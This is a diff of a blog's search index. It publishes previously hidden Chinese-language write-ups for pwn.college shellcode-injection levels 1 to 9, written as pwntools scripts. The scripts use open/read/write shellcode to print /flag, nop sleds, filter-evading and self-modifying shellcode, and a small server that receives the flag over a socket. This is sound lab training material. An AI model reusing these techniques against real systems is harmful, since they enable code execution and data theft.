@@ -13785,7 +13785,7 @@ if __name__ == &quot;__main__&quot;:
   <entry>
     <title>CVE-2017-6736</title>
     <url>/2024/01/24/CVE-2017-6736/</url>
-    <content><![CDATA[<h6 id="PREFACE："><a href="#PREFACE：" class="headerlink" title="PREFACE："></a>PREFACE：</h6><span id="more"></span>
+    <content><![CDATA[<h6 id="PREFACE：偷点纯真的理解"><a href="#PREFACE：偷点纯真的理解" class="headerlink" title="PREFACE：偷点纯真的理解"></a>PREFACE：偷点纯真的理解</h6><span id="more"></span>
 
 <h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>docker环境 (ubuntu 15)：</p>
 <pre><code class="shell">docker pull ubuntu:wily
@@ -13937,15 +13937,13 @@ set endian big
     <url>/2024/02/26/pwnCollege/</url>
     <content><![CDATA[<h6 id="隐藏了"><a href="#隐藏了" class="headerlink" title="隐藏了~"></a>隐藏了~</h6><span id="more"></span>
 
-<!-- assembly crash course level 26
-
-```assembly
-.section .text
+<p>assembly crash course level 26</p>
+<pre><code class="assembly">.section .text
 .global _start
 
 _start:
     cmp $4, %rdi               # Compare rdi with 3
-    ja default_case            # If rdi > 3, jump to default case
+    ja default_case            # If rdi &gt; 3, jump to default case
 
     # Calculate jump address based on rdi value
     lea (%rsi,%rdi,8), %rax    # rax = rsi + rdi*8 (address in jump table)
@@ -13954,9 +13952,7 @@ _start:
 default_case:
     lea 32(%rsi), %rax    # rax = rsi + rdi*8 (address in jump table)
     jmp (%rax)                    # Jump to the default case address
-
-```
--->
+</code></pre>
 ]]></content>
   </entry>
   <entry>
@@ -13980,7 +13976,9 @@ default_case:
   <entry>
     <title>ubuntu python version manage</title>
     <url>/2024/01/31/ubuntu-python-version-manage/</url>
-    <content><![CDATA[<pre><code class="shell">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \
+    <content><![CDATA[<span id="more"></span>
+
+<pre><code class="shell">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \
 libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \
 libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl
 </code></pre>
@@ -13993,30 +13991,27 @@ libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl
     <url>/2024/03/05/shellcodeORW/</url>
     <content><![CDATA[<h6 id="PREFACE-pwn-college的shellcode-injection，算是一个小入门"><a href="#PREFACE-pwn-college的shellcode-injection，算是一个小入门" class="headerlink" title="PREFACE: pwn.college的shellcode injection，算是一个小入门~"></a>PREFACE: pwn.college的shellcode injection，算是一个小入门~</h6><span id="more"></span>
 
-<p>看了眼discord，不许开writeup，就隐藏了：&gt;</p>
-<!--
-### level 1
+<!-- 看了眼discord，不许开writeup，就隐藏了：> -->
 
-basic orw：
 
-```python
-from pwn import *
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>basic orw：</p>
+<pre><code class="python">from pwn import *
 from string import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 // close:
     mov rdi, 2
     mov rax, 3
     syscall
 
 // open:
-    mov rbx, 0x{flag_file}
+    mov rbx, 0x&#123;flag_file&#125;
     mov rsi, 0
     mov rdx, 0
     push rbx
@@ -14042,39 +14037,32 @@ shellcode = f'''
 // exit:
     mov rax, 0x3c
     syscall
-'''
+&#39;&#39;&#39;
 hex_shellcode = asm(shellcode)
 # print(hex_shellcode)
-p = gdb.debug('./level1_chall','b *main + 560\nb *main + 709')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
-# p.send(hex_shellcode + b'\n')
+p = gdb.debug(&#39;./level1_chall&#39;,&#39;b *main + 560\nb *main + 709&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
+# p.send(hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 2
-
-随机跳一段，全nop即可
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>随机跳一段，全nop即可</p>
+<pre><code class="python">from pwn import *
 from string import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 // close:
     mov rdi, 2
     mov rax, 3
     syscall
 
 // open:
-    mov rbx, 0x{flag_file}
+    mov rbx, 0x&#123;flag_file&#125;
     mov rsi, 0
     mov rdx, 0
     push rbx
@@ -14100,40 +14088,33 @@ shellcode = f'''
 // exit:
     mov rax, 0x3c
     syscall
-'''
+&#39;&#39;&#39;
 hex_shellcode = asm(shellcode)
 # print(hex_shellcode)
-p = gdb.debug('./level2_chall','b *main + 910')
+p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
 # while (True):
-#     p = process('./level2_chall')
-#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
-#     # p.send(hex_shellcode + b'\n')
+#     p = process(&#39;./level2_chall&#39;)
+#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
+#     # p.send(hex_shellcode + b&#39;\n&#39;)
 #     print(p.recv())
-#     if (b'flag' in p.recv()):
+#     if (b&#39;flag&#39; in p.recv()):
 #         print(p.recv())
 #         break
 #     p.close()
-p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 3
-
-禁用`\x00`
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>禁用<code>\x00</code></p>
+<pre><code class="python">from pwn import *
 from string import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 // close:
     xor rdx, rdx
     xor rdi, rdi
@@ -14176,40 +14157,33 @@ shellcode = f'''
 // exit:
     mov al, 0x3c
     syscall
-'''
+&#39;&#39;&#39;
 hex_shellcode = asm(shellcode)
 # print(hex_shellcode)
-p = gdb.debug('./level2_chall','b *main + 910')
+p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
 # while (True):
-#     p = process('./level2_chall')
-#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
-#     # p.send(hex_shellcode + b'\n')
+#     p = process(&#39;./level2_chall&#39;)
+#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
+#     # p.send(hex_shellcode + b&#39;\n&#39;)
 #     print(p.recv())
-#     if (b'flag' in p.recv()):
+#     if (b&#39;flag&#39; in p.recv()):
 #         print(p.recv())
 #         break
 #     p.close()
-p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 4
-
-ban 'H'，不能用xor和mov等，用push pop代替赋值即可
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>ban ‘H’，不能用xor和mov等，用push pop代替赋值即可</p>
+<pre><code class="python">from pwn import *
 from string import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 // close:
     push 0
     pop rdx
@@ -14269,73 +14243,66 @@ shellcode = f'''
 // exit:
     mov al, 0x3c
     syscall
-'''
+&#39;&#39;&#39;
 hex_shellcode = asm(shellcode)
 # print(hex_shellcode)
-# p = gdb.debug('./level2_chall','b *main + 910')
-p = process('/challenge/babyshell_level4')
+# p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
+p = process(&#39;/challenge/babyshell_level4&#39;)
 # while (True):
-#     p = process('./level2_chall')
-#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
-#     # p.send(hex_shellcode + b'\n')
+#     p = process(&#39;./level2_chall&#39;)
+#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
+#     # p.send(hex_shellcode + b&#39;\n&#39;)
 #     print(p.recv())
-#     if (b'flag' in p.recv()):
+#     if (b&#39;flag&#39; in p.recv()):
 #         print(p.recv())
 #         break
 #     p.close()
-p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
 p.interactive()
 # p.recv()
-```
-
-
-
-### level 5
-
-ban syscall等，得smc拿（代码写复杂了，可以直接获取rip的，不过一时没想起来就用了他的leak来找地址）
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>ban syscall等，得smc拿（代码写复杂了，可以直接获取rip的，不过一时没想起来就用了他的leak来找地址）</p>
+<pre><code class="python">from pwn import *
 from string import *
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 
-# p = gdb.debug('./level5_chall','b *main\nb *main + 873')
-p = process('./level5_chall')
-p.recvuntil('[LEAK] Mapping shellcode memory at ')
+# p = gdb.debug(&#39;./level5_chall&#39;,&#39;b *main\nb *main + 873&#39;)
+p = process(&#39;./level5_chall&#39;)
+p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
 leak_addr = p.recvn(10).decode()
 leak_addr = int(leak_addr, 16)
 
 # close
-shellcode = b''
-shellcode_close = '''
+shellcode = b&#39;&#39;
+shellcode_close = &#39;&#39;&#39;
     xor rdi, rdi
     xor rdx, rdx
     xor rax, rax
     xor rsi,rsi
     mov dil, 2
     mov al, 3
-'''
+&#39;&#39;&#39;
 shellcode_close = asm(shellcode_close)
 shellcode += shellcode_close
-syscall = '''
+syscall = &#39;&#39;&#39;
     syscall
-'''
+&#39;&#39;&#39;
 syscall = asm(syscall)
-after_syscall = bytes(a ^ b for a,b in zip(b'\x90\x90', syscall))
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # open
-shellcode_open = '''
+shellcode_open = &#39;&#39;&#39;
     mov al, 2
     xor rdx, rdx
     xor rsi, rsi
@@ -14343,133 +14310,124 @@ shellcode_open = '''
     push rbx
     push rsp
     pop rdi
-'''
+&#39;&#39;&#39;
 shellcode_open = asm(shellcode_open)
 shellcode += shellcode_open
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # read
-shellcode_read = '''
+shellcode_read = &#39;&#39;&#39;
     mov rdi, rax
     mov rsi, rsp
     mov rdx, 0x100
     mov al, 0
-'''
+&#39;&#39;&#39;
 shellcode_read = asm(shellcode_read)
 shellcode += shellcode_read
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # write
-shellcode_write = '''
+shellcode_write = &#39;&#39;&#39;
     mov rdi, 1
     mov rsi, rsp
     mov rdx, rax
     mov al, 1
-'''
+&#39;&#39;&#39;
 shellcode_write = asm(shellcode_write)
 shellcode += shellcode_write
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
-shellcode_exit = '''
+shellcode_exit = &#39;&#39;&#39;
     mov rax, 60
-'''
+&#39;&#39;&#39;
 shellcode_exit = asm(shellcode_exit)
 shellcode += shellcode_exit
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
-# print('--------------------------------------')
+# print(&#39;--------------------------------------&#39;)
 # print(disasm(shellcode))
-# print('--------------------------------------')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',shellcode + b'\n')
+# print(&#39;--------------------------------------&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 6
-
-比起上一题多了禁用前0x1000的write，不过长度够可以直接绕
-
-```
-.rept 0x1000
+</code></pre>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>比起上一题多了禁用前0x1000的write，不过长度够可以直接绕</p>
+<pre><code>.rept 0x1000
     nop
 .endr
-```
-
-```python
-from pwn import *
+</code></pre>
+<pre><code class="python">from pwn import *
 from string import *
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'],log_level='debug')
-flag_file = '/flag'
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 
-p = gdb.debug('./level6_chall','b *main\nb *main + 957\nb *main + 525')
-# p = process('./level6_chall')
-p.recvuntil('[LEAK] Mapping shellcode memory at ')
+p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
+# p = process(&#39;./level6_chall&#39;)
+p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
 leak_addr = p.recvn(10).decode()
 leak_addr = int(leak_addr, 16)
 
 # close
-shellcode = '''
+shellcode = &#39;&#39;&#39;
 .rept 0x1000
 nop
 .endr
-'''
+&#39;&#39;&#39;
 shellcode = asm(shellcode)
-shellcode_close = '''
+shellcode_close = &#39;&#39;&#39;
     xor rdi, rdi
     xor rdx, rdx
     xor rax, rax
     xor rsi,rsi
     mov dil, 2
     mov al, 3
-'''
+&#39;&#39;&#39;
 shellcode_close = asm(shellcode_close)
 shellcode += shellcode_close
-syscall = '''
+syscall = &#39;&#39;&#39;
     syscall
-'''
+&#39;&#39;&#39;
 syscall = asm(syscall)
-after_syscall = bytes(a ^ b for a,b in zip(b'\x90\x90', syscall))
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # open
-shellcode_open = '''
+shellcode_open = &#39;&#39;&#39;
     mov al, 2
     xor rdx, rdx
     xor rsi, rsi
@@ -14477,122 +14435,111 @@ shellcode_open = '''
     push rbx
     push rsp
     pop rdi
-'''
+&#39;&#39;&#39;
 shellcode_open = asm(shellcode_open)
 shellcode += shellcode_open
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # read
-shellcode_read = '''
+shellcode_read = &#39;&#39;&#39;
     mov rdi, rax
     mov rsi, rsp
     mov rdx, 0x100
     mov al, 0
-'''
+&#39;&#39;&#39;
 shellcode_read = asm(shellcode_read)
 shellcode += shellcode_read
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
 # write
-shellcode_write = '''
+shellcode_write = &#39;&#39;&#39;
     mov rdi, 1
     mov rsi, rsp
     mov rdx, rax
     mov al, 1
-'''
+&#39;&#39;&#39;
 shellcode_write = asm(shellcode_write)
 shellcode += shellcode_write
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
 
-shellcode_exit = '''
+shellcode_exit = &#39;&#39;&#39;
     mov rax, 60
-'''
+&#39;&#39;&#39;
 shellcode_exit = asm(shellcode_exit)
 shellcode += shellcode_exit
-syscall = f'''
-    mov rbx, {leak_addr + len(shellcode) + 14}
-    xor byte ptr [rbx], {after_syscall[0]}
-    xor byte ptr [rbx+1], {after_syscall[1]}
+syscall = f&#39;&#39;&#39;
+    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
+    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
+    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
     nop
     nop
-'''
+&#39;&#39;&#39;
 shellcode += asm(syscall)
-p.sendafter('Reading 0x2000 bytes from stdin.\n',shellcode + b'\n')
+p.sendafter(&#39;Reading 0x2000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
 # h = p.recv(0x2000)
 # print(h)
 p.interactive()
-```
+</code></pre>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>ban stdin stdout stderr，这里用socket来传</p>
+<p>开server接：</p>
+<pre><code class="python">import socket
 
-
-
-### level 7
-
-ban stdin stdout stderr，这里用socket来传
-
-开server接：
-
-```python
-import socket
-
-def start_server(host='0.0.0.0', port=5678):
+def start_server(host=&#39;0.0.0.0&#39;, port=5678):
     while(True):
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         server_socket.bind((host, port))
 
         server_socket.listen(5)
-        print(f"Listening on {host}:{port}...")
+        print(f&quot;Listening on &#123;host&#125;:&#123;port&#125;...&quot;)
 
         client_socket, addr = server_socket.accept()
-        print(f"Accepted a connection from {addr}")
+        print(f&quot;Accepted a connection from &#123;addr&#125;&quot;)
 
         data = client_socket.recv(1024)
-        print("Received data:", data.decode())
+        print(&quot;Received data:&quot;, data.decode())
 
         client_socket.close()
         server_socket.close()
 
-if __name__ == "__main__":
+if __name__ == &quot;__main__&quot;:
     start_server()
-```
-
-exp:
-
-``` python
-from pwn import *
+</code></pre>
+<p>exp:</p>
+<pre><code class="python">from pwn import *
 from string import *
-context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 
-# p = gdb.debug('./level6_chall','b *main\nb *main + 957\nb *main + 525')
-p = process('/challenge/babyshell_level7')
-p.recvuntil('Mapped 0x4000 bytes for shellcode at ')
+# p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
+p = process(&#39;/challenge/babyshell_level7&#39;)
+p.recvuntil(&#39;Mapped 0x4000 bytes for shellcode at &#39;)
 leak_addr = p.recvn(10).decode()
 leak_addr = int(leak_addr, 16)
-shellcode = '''
+shellcode = &#39;&#39;&#39;
 // socket:
     mov rdi, 2
     mov rsi, 1
@@ -14658,22 +14605,15 @@ shellcode = '''
 // exit
     mov rax, 59
     syscall
-'''
+&#39;&#39;&#39;
 shellcode = asm(shellcode)
-p.sendafter('Reading 0x4000 bytes from stdin.\n',shellcode + b'\n')
+p.sendafter(&#39;Reading 0x4000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
 # h = p.recv(0x2000)
 # print(h)
 p.interactive()
-```
-
-
-
-### level 8
-
-0x12 bytes，用的是chmod('file',7)，`ln -s /flag f`软链接到f上来节约字符
-
-```
-.intel_syntax noprefix
+</code></pre>
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>0x12 bytes，用的是chmod(‘file’,7)，<code>ln -s /flag f</code>软链接到f上来节约字符</p>
+<pre><code>.intel_syntax noprefix
 .text
 .globl _start
 _start:
@@ -14683,22 +14623,16 @@ _start:
     push rsp
     pop rdi
     syscall
-```
-
-> cat flag
-
-
-
-### level 9
-
-每十个会CC十个，那么写一个生成shellcode，使得超过10个的时候会加入一个jmp（注意不能用qword mov这种大于等于八字节的指令，算是这题隐性的ban list）：
-
-```python
-from pwn import *
+</code></pre>
+<blockquote>
+<p>cat flag</p>
+</blockquote>
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>每十个会CC十个，那么写一个生成shellcode，使得超过10个的时候会加入一个jmp（注意不能用qword mov这种大于等于八字节的指令，算是这题隐性的ban list）：</p>
+<pre><code class="python">from pwn import *
 from string import *
 from random import *
-context(os='linux',arch='amd64')
-shellcode = f'''    mov rdi, 2
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+shellcode = f&#39;&#39;&#39;    mov rdi, 2
     mov rax, 3
     syscall
     xor rsi, rsi
@@ -14726,20 +14660,20 @@ shellcode = f'''    mov rdi, 2
     mov al, 1
     syscall
     mov rax, 0x3c
-    syscall'''
+    syscall&#39;&#39;&#39;
 shellcode_list = shellcode.splitlines()
 # print(shellcode_list)
-shellcode_tmp = ''
+shellcode_tmp = &#39;&#39;
 shellcode_len = 0
 shellcode_pad_flag = 0
 i = 0
-while (i < len(shellcode_list)):
-    # print(f'shellcode_tmp [{i}]: \n',shellcode_tmp)
+while (i &lt; len(shellcode_list)):
+    # print(f&#39;shellcode_tmp [&#123;i&#125;]: \n&#39;,shellcode_tmp)
     if ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 1):
-        if (shellcode_len % 10 <= 8):
-            random_str = ''.join(choices(string.ascii_letters, k=4))
+        if (shellcode_len % 10 &lt;= 8):
+            random_str = &#39;&#39;.join(choices(string.ascii_letters, k=4))
             pad = -(shellcode_len % 10) + 8 + 10
-            shellcode_tmp += f"    jmp {random_str}\n    .rept {pad}\n    nop\n    .endr\n{random_str}:\n"
+            shellcode_tmp += f&quot;    jmp &#123;random_str&#125;\n    .rept &#123;pad&#125;\n    nop\n    .endr\n&#123;random_str&#125;:\n&quot;
             shellcode_len += pad + 2
             shellcode_pad_flag = 0
         else:
@@ -14747,12 +14681,12 @@ while (i < len(shellcode_list)):
             shellcode_len -= len(asm(shellcode_list[i - 1]))
             tmp = shellcode_tmp.splitlines()
             tmp = tmp[:-1]
-            shellcode_tmp = '\n'.join(tmp)
-            shellcode_tmp += '\n'
+            shellcode_tmp = &#39;\n&#39;.join(tmp)
+            shellcode_tmp += &#39;\n&#39;
             i -= 1
         
     elif ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 0):
-        shellcode_tmp += shellcode_list[i] + '\n'
+        shellcode_tmp += shellcode_list[i] + &#39;\n&#39;
         shellcode_len += len(asm(shellcode_list[i]))
         i += 1
         
@@ -14760,29 +14694,26 @@ while (i < len(shellcode_list)):
         shellcode_len -= len(asm(shellcode_list[i - 1]))
         tmp = shellcode_tmp.splitlines()
         tmp = tmp[:-1]
-        shellcode_tmp = '\n'.join(tmp)
-        shellcode_tmp += '\n'
+        shellcode_tmp = &#39;\n&#39;.join(tmp)
+        shellcode_tmp += &#39;\n&#39;
         i -= 1
         shellcode_pad_flag = 1
         
     
 print(shellcode_tmp)
-```
-
-生成的exp
-
-```python
-from pwn import *
+</code></pre>
+<p>生成的exp</p>
+<pre><code class="python">from pwn import *
 from string import *
 from random import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''    mov rdi, 2
+shellcode = f&#39;&#39;&#39;    mov rdi, 2
     jmp EIBi
     .rept 11
     nop
@@ -14885,36 +14816,28 @@ AbtY:
 UuTH:
     syscall
     mov rax, 0x3c
-    syscall'''
+    syscall&#39;&#39;&#39;
 
 hex_shellcode = asm(shellcode)
 print(hex_shellcode)
-p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
-# p = process('./level9_chall_cp')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
-# p.send(hex_shellcode + b'\n')
+p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
+# p = process(&#39;./level9_chall_cp&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
